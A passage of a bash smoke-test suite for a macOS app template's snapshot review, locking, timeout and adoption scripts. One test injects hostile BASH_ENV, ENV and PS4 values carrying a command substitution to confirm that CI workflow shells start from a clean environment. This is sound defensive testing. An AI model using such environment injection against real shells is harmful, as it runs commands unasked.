    "ItemListTests/ItemListSnapshotTests/empty.light",
}
matches = [item for item in manifest["exports"] if item["baseline_identity"] in identities]
if len(matches) != 2 or {item["baseline_identity"] for item in matches} != identities:
    raise SystemExit("stale inventory fixture identities are ambiguous")
for item in matches:
    for key in ("path", "metadata_path"):
        candidate = fixture / item[key]
        if candidate.parent != fixture or candidate.is_symlink() or not candidate.is_file():
            raise SystemExit("stale inventory fixture entry is unsafe")
        candidate.unlink()
PY
  set +e
  /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$stale_fixture" complete "" render-only \
    >"$stale_log" 2>&1
  stale_status=$?
  set -e
  [[ "$stale_status" -ne 0 ]] || return 1
  grep -q 'snapshot render inventory mismatch: missing=2 unexpected=0' "$stale_log"

  inventory_fixture="$copy/artifacts/inventory-fixture"
  unsafe="$copy/artifacts/inventory-unsafe"
  unsafe_log="$copy/artifacts/inventory-unsafe.log"
  mkdir "$inventory_fixture"
  /usr/bin/rsync -a --exclude run.json "$export_dir/" "$inventory_fixture/"
  /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$inventory_fixture" complete "" render-only >/dev/null
  unsafe_source="$(find "$inventory_fixture" -maxdepth 1 -type f -name '*.png' -print -quit)"

  /usr/bin/rsync -a --delete "$inventory_fixture/" "$unsafe/"
  mkdir "$unsafe/nested"
  if /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$unsafe" complete "" render-only >"$unsafe_log" 2>&1; then
    echo "snapshot inventory accepted a nested export directory" >&2
    return 1
  fi
  grep -q 'not a single-link regular file' "$unsafe_log"

  /usr/bin/rsync -a --delete "$inventory_fixture/" "$unsafe/"
  ln -s "$inventory_fixture" "$unsafe/nested"
  if /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$unsafe" complete "" render-only >"$unsafe_log" 2>&1; then
    echo "snapshot inventory accepted a symlinked export directory" >&2
    return 1
  fi
  grep -q 'not a single-link regular file' "$unsafe_log"

  /usr/bin/rsync -a --delete "$inventory_fixture/" "$unsafe/"
  ln -s "$(basename "$unsafe_source")" "$unsafe/00-alias.png"
  if /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$unsafe" complete "" render-only >"$unsafe_log" 2>&1; then
    echo "snapshot inventory accepted a symlinked export file" >&2
    return 1
  fi
  grep -q 'not a single-link regular file' "$unsafe_log"

  /usr/bin/rsync -a --delete "$inventory_fixture/" "$unsafe/"
  ln "$unsafe/$(basename "$unsafe_source")" "$unsafe/00-alias.png"
  if /usr/bin/python3 -I "$copy/scripts/support/check_snapshot_inventory.py" \
    "$copy/Packages/Features" "$unsafe" complete "" render-only >"$unsafe_log" 2>&1; then
    echo "snapshot inventory accepted a multiply linked export file" >&2
    return 1
  fi
  grep -q 'not a single-link regular file' "$unsafe_log"

  test_support_manifest="$copy/Packages/TestSupport/Package.swift"
  /usr/bin/python3 -I - "$test_support_manifest" <<'PY'
import pathlib
import sys

path = pathlib.Path(sys.argv[1])
path.write_text(path.read_text().replace(
    "swiftSettings: [.defaultIsolation(MainActor.self)]",
    'swiftSettings: [.defaultIsolation(MainActor.self), .define("SNAPSHOT_RENDER_ONLY")]',
    1,
))
PY
  "$copy/scripts/check-dependency-inputs.sh" \
    --write Packages/TestSupport/Package.swift >/dev/null
  mode_log="$copy/artifacts/strict-compiled-mode-mismatch.log"
  set +e
  "$copy/scripts/snapshot.sh" \
    Features ItemListTests/ItemListSnapshotTests/loaded >"$mode_log" 2>&1
  mode_status=$?
  set -e
  [[ "$mode_status" -ne 0 ]] || return 1
  grep -q 'SnapshotSupport cannot compile with two verification modes' "$mode_log"
}

test_snapshot_lock_contract() {
  local copy external lock
  copy="$(fixture snapshot-lock)"
  lock="$copy/.snapshot-operation-lock"
  mkdir "$lock"
  printf '{"pid": 999999, "command": "stale", "started_at": "2000-01-01T00:00:00Z"}\n' >"$lock/owner.json"
  (
    # shellcheck disable=SC1090
    . "$copy/scripts/lib.sh"
    acquire_snapshot_operation_lock
    [[ -f "$copy/.snapshot-operation-lock/owner.json" ]] || return 1
    release_snapshot_operation_lock
  )
  [[ ! -e "$lock" ]] || return 1

  mkdir "$lock"
  if (
    # shellcheck disable=SC1090
    . "$copy/scripts/lib.sh"
    acquire_snapshot_operation_lock
  ); then
    echo "snapshot lock recovered ownerless metadata during a possible acquisition race" >&2
    return 1
  fi
  [[ -d "$lock" ]] || return 1
  rmdir "$lock"

  mkdir "$lock"
  printf '{"pid": %s, "command": "live", "started_at": "now"}\n' "$$" >"$lock/owner.json"
  if (
    # shellcheck disable=SC1090
    . "$copy/scripts/lib.sh"
    acquire_snapshot_operation_lock
  ); then
    echo "snapshot lock accepted a live owner" >&2
    return 1
  fi
  rm -f "$lock/owner.json"
  rmdir "$lock"

  external="$copy/external-lock"
  mkdir "$external"
  printf 'do not delete\n' >"$external/owner.json"
  ln -s "$external" "$lock"
  if (
    # shellcheck disable=SC1090
    . "$copy/scripts/lib.sh"
    acquire_snapshot_operation_lock
  ); then
    echo "snapshot lock accepted a symlink" >&2
    return 1
  fi
  [[ "$(<"$external/owner.json")" == "do not delete" ]] || return 1
  rm "$lock"
}

test_snapshot_diff_review_contract() {
  local copy baseline candidate candidates proposal_sha review output
  copy="$(fixture snapshot-diff-review)"
  baseline="$copy/Packages/Features/Tests/ItemListTests/__Snapshots__/ItemListSnapshotTests/empty.light.png"
  candidates="$copy/artifacts/snapshot-candidates/review-Features"
  candidate="$candidates/ItemListSnapshotTests/empty.light.png"
  review="$copy/artifacts/snapshot-review/review-Features"
  mkdir -p "$(dirname "$candidate")" "$(dirname "$review")"

  /usr/bin/python3 -I - "$copy/scripts" "$baseline" "$candidate" <<'PY'
import pathlib
import sys

sys.path.insert(0, sys.argv[1])
import snapshot_png as png

baseline = png.load(pathlib.Path(sys.argv[2]))
pixels = bytearray(baseline.pixels)
for y in range(min(80, baseline.height)):
    for x in range(min(120, baseline.width)):
        offset = (y * baseline.width + x) * 3
        pixels[offset : offset + 3] = b"\xebF\x82"
candidate = png.Image(baseline.width, baseline.height, bytes(pixels))
pathlib.Path(sys.argv[3]).write_bytes(png.encode(candidate))
PY

  output="$(cd "$copy" && scripts/snapshot-review.sh \
    Features "$candidates" review)"
  grep -q '^SNAPSHOT_REVIEW_MOVED=1$' <<<"$output"
  grep -q '^SNAPSHOT_REVIEW_LARGEST=ItemListSnapshotTests/empty ' <<<"$output"
  grep -q 'what moved' "$review/review.html"
  grep -q 'data:image/png;base64' "$review/review.html"
  proposal_sha="$(shasum -a 256 "$review/proposal.json" | awk '{print $1}')"

  cp "$review/proposal.json" "$review/proposal.original.json"
  /usr/bin/python3 -I - "$candidate" "$review/proposal.json" <<'PY'
import hashlib
import json
import pathlib
import sys

candidate, proposal_path = map(pathlib.Path, sys.argv[1:])
candidate.write_bytes(candidate.read_bytes() + b"tampered")
proposal = json.loads(proposal_path.read_text())
proposal["changed"][0]["candidateSHA256"] = hashlib.sha256(candidate.read_bytes()).hexdigest()
proposal_path.write_text(json.dumps(proposal, indent=2, sort_keys=True) + "\n")
PY
  if (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha" --dry-run) \
    >"$copy/artifacts/tampered-review.log" 2>&1; then
    echo "snapshot acceptance trusted a self-consistent tampered proposal" >&2
    return 1
  fi
  grep -Eq 'no longer matches|completion envelope|not bound' "$copy/artifacts/tampered-review.log"
  cp "$review/proposal.original.json" "$review/proposal.json"
  rm "$review/proposal.original.json"
  /usr/bin/python3 -I - "$candidate" <<'PY'
import pathlib
import sys

with pathlib.Path(sys.argv[1]).open("wb") as stream:
    stream.truncate(32 * 1024 * 1024 + 1)
PY
  if (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha" --dry-run) \
    >"$copy/artifacts/oversized-acceptance.log" 2>&1; then
    echo "snapshot acceptance read an oversized candidate" >&2
    return 1
  fi
  grep -q 'size limit' "$copy/artifacts/oversized-acceptance.log"
  /usr/bin/python3 -I - "$copy/scripts" "$baseline" "$candidate" <<'PY'
import pathlib
import sys

sys.path.insert(0, sys.argv[1])
import snapshot_png as png

baseline = png.load(pathlib.Path(sys.argv[2]))
pixels = bytearray(baseline.pixels)
for y in range(min(80, baseline.height)):
    for x in range(min(120, baseline.width)):
        offset = (y * baseline.width + x) * 3
        pixels[offset : offset + 3] = b"\xebF\x82"
pathlib.Path(sys.argv[3]).write_bytes(png.encode(png.Image(baseline.width, baseline.height, bytes(pixels))))
PY

  cp "$copy/README.md" "$copy/artifacts/README.review-backup"
  printf '\nsource drift\n' >>"$copy/README.md"
  if (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha" --dry-run) \
    >"$copy/artifacts/source-drift-review.log" 2>&1; then
    echo "snapshot acceptance trusted a stale source state" >&2
    return 1
  fi
  grep -q 'source state changed' "$copy/artifacts/source-drift-review.log"
  cp "$copy/artifacts/README.review-backup" "$copy/README.md"

  (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha" --dry-run) >/dev/null
  (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha") >/dev/null
  cmp "$baseline" "$candidate"

  if (cd "$copy" && scripts/accept-snapshots.sh review-Features \
    --proposal-sha256 "$proposal_sha") \
    >"$copy/artifacts/stale-review.log" 2>&1; then
    echo "snapshot acceptance reused a stale baseline proposal" >&2
    return 1
  fi
  grep -Eq 'Baseline changed after review|source state changed' "$copy/artifacts/stale-review.log"

  local recovery="$copy/artifacts/snapshot-review/recovery-Features"
  mkdir -p "$recovery/rollback"
  cp "$baseline" "$recovery/rollback/0000.png"
  /usr/bin/python3 -I - "$baseline" "$recovery" <<'PY'
import hashlib
import json
import pathlib
import sys

baseline, review = map(pathlib.Path, sys.argv[1:])
original = baseline.read_bytes()
candidate = original + b"interrupted-acceptance"
baseline.write_bytes(candidate)
entry = {
    "suite": baseline.parent.name,
    "state": "recovery",
    "variant": "light",
    "image": baseline.name,
    "baselinePath": str(baseline),
    "candidatePath": str(review / "candidate.png"),
    "baselineSHA256": hashlib.sha256(original).hexdigest(),
    "candidateSHA256": hashlib.sha256(candidate).hexdigest(),
    "visibleFraction": 1.0,
    "anyFraction": 1.0,
    "maxDelta": 1.0,
    "resized": False,
}
proposal = {
    "schemaVersion": 2,
    "package": "Features",
    "runId": "recovery",
    "generated": "test",
    "head": "a" * 40,
    "sourceStateSHA256": "b" * 64,
    "changed": [entry],
    "new": [],
    "unmatched": [],
}
proposal_bytes = (json.dumps(proposal, indent=2, sort_keys=True) + "\n").encode()
(review / "proposal.json").write_bytes(proposal_bytes)
journal = {
    "schemaVersion": 2,
    "proposalSHA256": hashlib.sha256(proposal_bytes).hexdigest(),
    "phase": "installing",
    "installed": 1,
    "entries": [{
        "baselinePath": str(baseline),
        "backupPath": str(review / "rollback/0000.png"),
        "originalSHA256": entry["baselineSHA256"],
        "candidateSHA256": entry["candidateSHA256"],
        "stagedName": "",
    }],
}
(review / "acceptance-journal.json").write_text(json.dumps(journal, indent=2) + "\n")
PY
  /usr/bin/python3 -I "$copy/scripts/accept_snapshots.py" \
    --root "$copy" --recover-pending >/dev/null
  cmp "$baseline" "$candidate"
  [[ ! -e "$recovery/acceptance-journal.json" ]] || return 1
  [[ ! -e "$recovery/rollback" ]] || return 1

  local preparing="$copy/artifacts/snapshot-review/preparing-Features"
  mkdir -p "$preparing/rollback"
  printf 'partial-backup' >"$preparing/rollback/0000.png"
  /usr/bin/python3 -I - "$baseline" "$preparing" <<'PY'
import hashlib
import json
import pathlib
import sys

baseline, review = map(pathlib.Path, sys.argv[1:])
original_digest = hashlib.sha256(baseline.read_bytes()).hexdigest()
entry = {
    "suite": baseline.parent.name,
    "state": "preparing",
    "variant": "light",
    "image": baseline.name,
    "baselinePath": str(baseline),
    "candidatePath": str(review / "candidate.png"),
    "baselineSHA256": original_digest,
    "candidateSHA256": "c" * 64,
    "visibleFraction": 1.0,
    "anyFraction": 1.0,
    "maxDelta": 1.0,
    "resized": False,
}
proposal = {
    "schemaVersion": 2,
    "package": "Features",
    "runId": "preparing",
    "generated": "test",
    "head": "a" * 40,
    "sourceStateSHA256": "b" * 64,
    "changed": [entry],
    "new": [],
    "unmatched": [],
}
proposal_bytes = (json.dumps(proposal, indent=2, sort_keys=True) + "\n").encode()
(review / "proposal.json").write_bytes(proposal_bytes)
journal = {
    "schemaVersion": 2,
    "proposalSHA256": hashlib.sha256(proposal_bytes).hexdigest(),
    "phase": "installing",
    "installed": 0,
    "entries": [{
        "baselinePath": str(baseline),
        "backupPath": str(review / "rollback/0000.png"),
        "originalSHA256": original_digest,
        "candidateSHA256": entry["candidateSHA256"],
        "stagedName": ".snapshot-accept." + "d" * 24,
    }],
}
(review / "acceptance-journal.json").write_text(json.dumps(journal, indent=2) + "\n")
PY
  /usr/bin/python3 -I "$copy/scripts/accept_snapshots.py" \
    --root "$copy" --recover-pending >/dev/null
  cmp "$baseline" "$candidate"
  [[ ! -e "$preparing/acceptance-journal.json" ]] || return 1
  [[ ! -e "$preparing/rollback" ]] || return 1

  local orphan_candidates="$copy/artifacts/snapshot-candidates/orphan"
  mkdir -p "$orphan_candidates/UnknownSnapshotTests"
  cp "$baseline" "$orphan_candidates/UnknownSnapshotTests/unknown.light.png"
  output="$(cd "$copy" && scripts/snapshot-review.sh \
    Features "$orphan_candidates" orphan)"
  grep -q '^SNAPSHOT_REVIEW_UNMATCHED=1$' <<<"$output"
  grep -q '^SNAPSHOT_REVIEW_BLOCKED=unmatched candidates$' <<<"$output"
  ! grep -q '^SNAPSHOT_REVIEW_RESULT=every baseline matched$' <<<"$output" || return 1
  ! grep -q '^SNAPSHOT_REVIEW_ACCEPT=' <<<"$output" || return 1
  grep -q 'Acceptance is blocked' \
    "$copy/artifacts/snapshot-review/orphan-Features/review.html"

  local resize_candidates="$copy/artifacts/snapshot-candidates/resize"
  mkdir -p "$resize_candidates/ItemListSnapshotTests"
  /usr/bin/python3 -I - "$copy/scripts" "$baseline" \
    "$resize_candidates/ItemListSnapshotTests/empty.light.png" <<'PY'
import pathlib
import sys

sys.path.insert(0, sys.argv[1])
import snapshot_png as png

image = png.load(pathlib.Path(sys.argv[2]))
width = image.width - 100
rows = []
for y in range(image.height):
    start = y * image.width * 3
    rows.append(image.pixels[start : start + width * 3])
pathlib.Path(sys.argv[3]).write_bytes(png.encode(png.Image(width, image.height, b"".join(rows))))
PY
  (cd "$copy" && scripts/snapshot-review.sh \
    Features "$resize_candidates" resize) >/dev/null
  /usr/bin/python3 -I - "$copy/artifacts/snapshot-review/resize-Features/proposal.json" <<'PY'
import json
import pathlib
import sys

proposal = json.loads(pathlib.Path(sys.argv[1]).read_text())
if len(proposal["changed"]) != 1 or proposal["changed"][0]["resized"] is not True:
    raise SystemExit("resized snapshot was not classified")
PY
  if cmp -s \
    "$copy/artifacts/snapshot-review/resize-Features/rendered/0000.after.png" \
    "$copy/artifacts/snapshot-review/resize-Features/rendered/0000.heatmap.png"; then
    echo "resized snapshot heatmap duplicated the plain after image" >&2
    return 1
  fi
  [[ -s "$copy/artifacts/snapshot-review/resize-Features/rendered/0000.before-crop.png" ]] || return 1
  [[ -s "$copy/artifacts/snapshot-review/resize-Features/rendered/0000.after-crop.png" ]] || return 1

  local oversized="$copy/artifacts/snapshot-candidates/oversized"
  mkdir -p "$oversized/ItemListSnapshotTests"
  /usr/bin/python3 -I - "$oversized/ItemListSnapshotTests/empty.light.png" <<'PY'
import pathlib
import sys

pathlib.Path(sys.argv[1]).write_bytes(
    b"\x89PNG\r\n\x1a\n" + b"\x00\x00\x00\rIHDR" +
    (9000).to_bytes(4, "big") + (9000).to_bytes(4, "big")
)
PY
  if (cd "$copy" && scripts/snapshot-review.sh Features "$oversized" oversized) \
    >"$copy/artifacts/oversized-review.log" 2>&1; then
    echo "snapshot review decoded an oversized PNG" >&2
    return 1
  fi
  grep -q 'dimensions exceed review limits' "$copy/artifacts/oversized-review.log"
}

test_snapshot_timeout_contract() {
  local child child_group copy elapsed group_child group_leader group_log live_members log started status wrapper
  copy="$(fixture timeout)"
  log="$copy/timeout.log"
  set +e
  "$copy/scripts/support/run_with_timeout.py" --timeout 1 --log "$log" -- /bin/sleep 3
  status=$?
  set -e
  [[ "$status" -eq 124 ]] || return 1
  grep -q "timed out after 1 seconds" "$log"

  /usr/bin/python3 -I - \
    "$copy/scripts/support/run_with_timeout.py" \
    "$copy/popen-signal-race.log" <<'PY'
import os
import pathlib
import signal
import sys
import time

source_path, log_path = map(pathlib.Path, sys.argv[1:])
namespace = {"__name__": "run_with_timeout_signal_race"}
exec(compile(source_path.read_text(), str(source_path), "exec"), namespace)
subprocess_module = namespace["subprocess"]
real_popen = subprocess_module.Popen
spawned: list[int] = []


def racing_popen(*args: object, **kwargs: object):
    process = real_popen(*args, **kwargs)
    spawned.append(process.pid)
    os.kill(os.getpid(), signal.SIGTERM)
    return process


subprocess_module.Popen = racing_popen
original_argv = sys.argv
sys.argv = [
    str(source_path),
    "--timeout",
    "10",
    "--log",
    str(log_path),
    "--",
    "/bin/sleep",
    "30",
]
try:
    status = namespace["main"]()
finally:
    sys.argv = original_argv
    subprocess_module.Popen = real_popen

if status != 143 or len(spawned) != 1:
    raise SystemExit(1)
group_id = spawned[0]
for _ in range(100):
    try:
        os.killpg(group_id, 0)
    except ProcessLookupError:
        break
    time.sleep(0.01)
else:
    os.killpg(group_id, signal.SIGKILL)
    raise SystemExit("signal during Popen orphaned the child group")
PY

  "$copy/scripts/support/run_with_timeout.py" \
    --timeout 10 \
    --log "$copy/signal.log" \
    -- /bin/sh -c 'sleep 30 & echo $! >"$1"; wait' _ "$copy/child.pid" &
  wrapper=$!
  for _attempt in {1..100}; do
    [[ -s "$copy/child.pid" ]] && break
    sleep 0.1
  done
  [[ -s "$copy/child.pid" ]] || return 1
  kill -TERM "$wrapper"
  set +e
  wait "$wrapper"
  status=$?
  set -e
  [[ "$status" -eq 143 ]] || return 1
  child="$(cat "$copy/child.pid")"
  ! kill -0 "$child" 2>/dev/null || return 1

  group_log="$copy/inherited-timeout.log"
  started=$SECONDS
  /usr/bin/python3 -I "$copy/scripts/support/start_process_group.py" \
    /usr/bin/python3 -I "$copy/scripts/support/run_with_timeout.py" \
    --timeout 1 \
    --log "$group_log" \
    --inherit-process-group \
    -- /bin/bash -p -c 'trap "" TERM; /bin/sleep 30 & wait' &
  group_leader=$!
  set +e
  wait "$group_leader"
  status=$?
  set -e
  elapsed=$((SECONDS - started))
  [[ "$status" -eq 124 && "$elapsed" -le 5 ]] || return 1
  grep -q "timed out after 1 seconds" "$group_log"
  kill -0 -- "-$group_leader" 2>/dev/null
  kill -KILL -- "-$group_leader" 2>/dev/null || true
  for _attempt in {1..100}; do
    live_members="$(
      /bin/ps -axo pgid=,stat= \
        | /usr/bin/awk -v expected="$group_leader" \
          '$1 == expected && $2 !~ /^Z/ { count++ } END { print count + 0 }'
    )"
    [[ "$live_members" -eq 0 ]] && break
    /bin/sleep 0.01
  done
  [[ "$live_members" -eq 0 ]] || return 1

  /usr/bin/python3 -I "$copy/scripts/support/start_process_group.py" \
    /bin/bash -p -c '/bin/sleep 30 & echo $! >"$1"; wait' _ "$copy/group-child.pid" &
  group_leader=$!
  for _attempt in {1..100}; do
    [[ -s "$copy/group-child.pid" ]] && break
    /bin/sleep 0.01
  done
  group_child="$(cat "$copy/group-child.pid")"
  child_group="$(/bin/ps -p "$group_child" -o pgid= | /usr/bin/tr -d ' ')"
  [[ "$(/bin/ps -p "$group_leader" -o pgid= | /usr/bin/tr -d ' ')" == "$group_leader" ]] || return 1
  [[ "$child_group" == "$group_leader" ]] || return 1
  kill -KILL -- "-$group_leader"
  wait "$group_leader" 2>/dev/null || true
  ! kill -0 "$group_child" 2>/dev/null || return 1
}

test_adopt_rejects_escape_symlinks() {
  local copy external source
  source="$TMP_ROOT/adopt-source"
  copy="$TMP_ROOT/adopt-copy"
  external="$TMP_ROOT/external-ignore"
  mkdir "$source"
  printf 'owner data\n' >"$external"
  ln -s "$external" "$source/.gitignore"
  git -C "$source" init -q
  git -C "$source" add .gitignore
  git -C "$source" \
    -c user.name='Template Smoke' \
    -c user.email='template-smoke@example.invalid' \
    commit -qm 'source'
  if "$ROOT/scripts/adopt.sh" "$source" "$copy" >/dev/null 2>&1; then
    echo "adoption accepted a symlinked .gitignore" >&2
    return 1
  fi
  [[ "$(<"$external")" == "owner data" ]] || return 1

  rm -rf "$copy"
  git -C "$source" rm -q .gitignore 2>/dev/null
  mkdir "$TMP_ROOT/external-pre-adopt"
  ln -s "$TMP_ROOT/external-pre-adopt" "$source/pre-adopt"
  git -C "$source" add pre-adopt
  git -C "$source" \
    -c user.name='Template Smoke' \
    -c user.email='template-smoke@example.invalid' \
    commit -qm 'add reserved symlink'
  if "$ROOT/scripts/adopt.sh" "$source" "$copy" >/dev/null 2>&1; then
    echo "adoption accepted a pre-adopt symlink" >&2
    return 1
  fi
}

test_adopt_without_origin_preserves_source() {
  local copy log source
  source="$TMP_ROOT/no-origin-source"
  copy="$TMP_ROOT/no-origin-copy"
  log="$TMP_ROOT/no-origin-adopt.log"
  mkdir "$source"
  git -C "$source" init -q -b main
  printf 'original\n' >"$source/README.md"
  git -C "$source" add README.md
  git -C "$source" \
    -c user.name='Template Smoke' \
    -c user.email='template-smoke@example.invalid' \
    commit -qm 'source'

  GIT_AUTHOR_NAME='Template Smoke' \
  GIT_AUTHOR_EMAIL='template-smoke@example.invalid' \
  GIT_COMMITTER_NAME='Template Smoke' \
  GIT_COMMITTER_EMAIL='template-smoke@example.invalid' \
    "$ROOT/scripts/adopt.sh" "$source" "$copy" >"$log"

  [[ -z "$(git -C "$copy" remote)" ]] || return 1
  [[ "$(git -C "$copy" branch --show-current)" == "agent/harness-adopt" ]] || return 1
  ! git -C "$source" show-ref --verify --quiet refs/heads/agent/harness-adopt || return 1
  grep -q 'git remote add origin <your-github-repository>' "$log"
}

test_pid_ambiguity_contract() {
  local copy output
  copy="$(fixture pid)"
  [[ "$(bash -c '. "$1/scripts/lib.sh"; unique_pid_from_lines App $'"'"'42\n'"'"'' _ "$copy")" == "42" ]] || return 1
  if output="$(bash -c '. "$1/scripts/lib.sh"; unique_pid_from_lines App $'"'"'42\n84\n'"'"'' _ "$copy" 2>&1)"; then
    echo "multiple PIDs were accepted: $output" >&2
    return 1
  fi
  [[ "$output" == *"Ambiguous"* ]] || return 1
}

test_failed_launch_terminates_detached_process() {
  local binary copy launched_pid launch_status pid_file was_alive
  copy="$(fixture failed-launch-cleanup)"
  binary="$copy/.build/DerivedData/Build/Products/Debug/App.app/Contents/MacOS/App"
  pid_file="$copy/detached-app.pid"
  mkdir -p "$(dirname "$binary")"
  cat >"$binary" <<EOF
#!/bin/bash -p
printf '%s\n' "\$\$" >"$pid_file"
while :; do /bin/sleep 1; done
EOF
  chmod 700 "$binary"

  set +e
  bash -c '
    . "$1/scripts/lib.sh"
    TEST_COPY="$1"
    app_path() { printf "%s\n" "$TEST_COPY/.build/DerivedData/Build/Products/Debug/App.app"; }
    build_manifest_is_current() { return 0; }
    source_state_hash() { printf "fixture-source-state\n"; }
    terminate_app_processes() { return 0; }
    app_pid() {
      local value
      value="$(sed -n "1p" "$TEST_COPY/detached-app.pid" 2>/dev/null || true)"
      [[ "$value" =~ ^[0-9]+$ ]] && kill -0 "$value" 2>/dev/null || return 1
      printf "%s\n" "$value"
    }
    app_pids() { app_pid; }
    resolve_app_window() { return 1; }
    sleep() { /bin/sleep 0.001; }
    launch_app >/dev/null 2>&1
  ' _ "$copy"
  launch_status=$?
  set -e
  [[ "$launch_status" -ne 0 ]] || return 1

  launched_pid="$(sed -n '1p' "$pid_file" 2>/dev/null || true)"
  [[ "$launched_pid" =~ ^[0-9]+$ ]] || return 1
  was_alive=0
  if kill -0 "$launched_pid" 2>/dev/null; then
    was_alive=1
    kill -TERM "$launched_pid" 2>/dev/null || true
  fi
  if [[ "$was_alive" -ne 0 ]]; then
    echo "failed launch left detached process $launched_pid alive" >&2
    return 1
  fi
}

test_failed_launch_cleanup_revalidates_process_identity() {
  local copy count_file signal_file
  copy="$(fixture failed-launch-pid-reuse)"
  count_file="$copy/app-pids.count"
  signal_file="$copy/signals.log"
  printf '0\n' >"$count_file"
  : >"$signal_file"

  bash -c '
    . "$1/scripts/lib.sh"
    COUNT_FILE="$2"
    SIGNAL_FILE="$3"
    app_pids() {
      local count
      count="$(sed -n "1p" "$COUNT_FILE")"
      count=$((count + 1))
      printf "%s\n" "$count" >"$COUNT_FILE"
      [[ "$count" -eq 1 ]] && printf "4242\n"
    }
    kill() { printf "%s\n" "$*" >>"$SIGNAL_FILE"; }
    sleep() { :; }
    terminate_launched_process 4242
  ' _ "$copy" "$count_file" "$signal_file"

  [[ "$(sed -n '1p' "$signal_file")" == "-TERM 4242" ]] || return 1
  [[ "$(wc -l <"$signal_file" | tr -d ' ')" == "1" ]] || {
    echo "failed-launch cleanup signaled a PID after exact app identity disappeared" >&2
    return 1
  }

  : >"$signal_file"
  bash -c '
    . "$1/scripts/lib.sh"
    SIGNAL_FILE="$2"
    app_pids() { return 1; }
    kill() { printf "%s\n" "$*" >>"$SIGNAL_FILE"; }
    terminate_launched_process 4242
  ' _ "$copy" "$signal_file"
  [[ ! -s "$signal_file" ]] || {
    echo "failed-launch cleanup signaled a reused non-app PID" >&2
    return 1
  }
}

test_evaluator_shell_starts_from_clean_environment() {
  /usr/bin/python3 -I - "$ROOT" <<'PY'
import os
import pathlib
import shlex
import subprocess
import tempfile
import textwrap
import sys

root = pathlib.Path(sys.argv[1])
for relative in (
    ".github/workflows/evaluator-selection.yml",
    ".github/workflows/evaluator-sealed.yml",
):
    workflow = root / relative
    shell_line = next(
        line.split("shell:", 1)[1].strip()
        for line in workflow.read_text().splitlines()
        if line.lstrip().startswith("shell:")
    )
    with tempfile.TemporaryDirectory(prefix="factory-evaluator-shell-") as raw:
        work = pathlib.Path(raw)
        payload = work / "payload.sh"
        safe = work / "payload-ran"
        sentinel = work / "ambient-shell-ran"
        trace_sentinel = work / "ambient-trace-ran"
        environment_dump = work / "environment.txt"
        payload.write_text(
            f'/usr/bin/env >"{environment_dump}"\n/usr/bin/touch "{safe}"\n'
        )
        attack = work / "bash-env.sh"
        attack.write_text(f'/usr/bin/touch "{sentinel}"\n')
        command = [str(payload) if value == "{0}" else value for value in shlex.split(shell_line)]
        environment = os.environ.copy()
        environment.update({
            "BASH_ENV": str(attack),
            "ENV": str(attack),
            "PS4": f'$(/usr/bin/touch "{trace_sentinel}")',
            "SHELLOPTS": "xtrace",
            "EXPECTED_EVALUATOR_SHA256": "0" * 64,
            "EXPECTED_EVALUATOR_TEAM_ID": "ABCDEFGHIJ",
            "EXPECTED_EVALUATOR_UID": "501",
            "EXPECTED_TRUSTED_ROOT_SHA": "1" * 40,
            "PHASE": "reserve",
            "WORKFLOW_SHA": "1" * 40,
        })
        result = subprocess.run(command, env=environment, capture_output=True, text=True)
        assert result.returncode == 0, (relative, result.stderr)
        assert safe.exists(), relative
        assert not sentinel.exists(), f"{relative} evaluated ambient BASH_ENV before isolation"
        assert not trace_sentinel.exists(), f"{relative} evaluated ambient PS4 before isolation"
        inner_environment = environment_dump.read_text()
        for hostile_name in ("BASH_ENV=", "ENV=", "PS4=", "SHELLOPTS="):
            assert hostile_name not in inner_environment, (relative, hostile_name)
PY
}

test_commit_invalidates_build_provenance() {
  local after before binary copy digest export_dir head log source_state
  copy="$(fixture provenance-head)"
  copy="$(cd "$copy" && pwd -P)"
  binary="$copy/.build/DerivedData/Build/Products/Debug/App.app/Contents/MacOS/App"
  mkdir -p "$(dirname "$binary")" "$copy/artifacts"
  printf 'fixture executable\n' >"$binary"
  chmod 700 "$binary"
  source_state="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  head="$(git -C "$copy" rev-parse HEAD)"
  digest="$(shasum -a 256 "$binary" | awk '{print $1}')"
  export_dir="$copy/artifacts/preview-exports/old-head"
  log="$copy/artifacts/old-head-preview.log"
  mkdir -p "$export_dir"
  /usr/bin/python3 -I - \
    "$copy/artifacts/build-manifest.json" "$binary" "$digest" "$source_state" "$head" <<'PY'
import json
import pathlib
import sys

manifest, executable, digest, source_state, head = sys.argv[1:]
pathlib.Path(manifest).write_text(json.dumps({
    "schema_version": 1,
    "executable": executable,
    "executable_sha256": digest,
    "source_state_sha256": source_state,
    "git_head": head,
}) + "\n")
PY
  /usr/bin/python3 -I - "$export_dir/run.json" "$source_state" "$head" <<'PY'
import json
import pathlib
import sys

path, source_state, head = sys.argv[1:]
pathlib.Path(path).write_text(json.dumps({
    "schema_version": 2,
    "package": "Features",
    "filter": "",
    "status": 0,
    "valid": True,
    "verification_mode": "baseline",
    "verification_scope": "complete",
    "baselines_verified": True,
    "source_state_sha256": source_state,
    "head_commit": head,
    "renderer": {
        "macos_product_version": "test",
        "macos_build_version": "test",
        "architecture": "arm64",
        "xcode_version": "test",
        "sdk_version": "test",
        "sdk_build_version": "test",
        "swift_version": "test",
        "snapshot_testing_resolution_sha256": "0" * 64,
        "backing_scale_factor": 2,
        "color_space": "kCGColorSpaceDisplayP3",
    },
    "exports": [],
}) + "\n")
PY
  bash -c '. "$1/scripts/lib.sh"; build_manifest_is_current' _ "$copy"
  before="$(bash -c '. "$1/scripts/lib.sh"; source_state_hash' _ "$copy")"
  git -C "$copy" \
    -c user.name='Template Smoke' \
